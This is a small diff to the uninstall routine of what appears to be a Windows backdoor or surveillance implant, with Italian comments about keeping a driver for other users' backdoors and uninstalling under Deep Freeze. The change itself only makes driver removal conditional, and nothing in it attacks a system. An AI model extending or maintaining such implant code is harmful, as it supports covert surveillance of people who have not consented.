@@ -289,8 +289,9 @@ BOOL WINAPI DA_Uninstall(BYTE *dummy_param)
 	// la DLL core e la directory di lavoro (non puo' cancellarsi da sola)
 	HM_RemoveCore();
 
-	//Il driver deve rimanere se ci sono backdoor per altri utenti
-	//HM_RemoveDriver();
+	//Cancella il driver sull'ultima istanza
+	if (IsLastInstance())
+		HM_RemoveDriver();
 
 	// Tenta l'uninstall dal disco reale in caso di deep freeze
 	if (IsDeepFreeze()) {
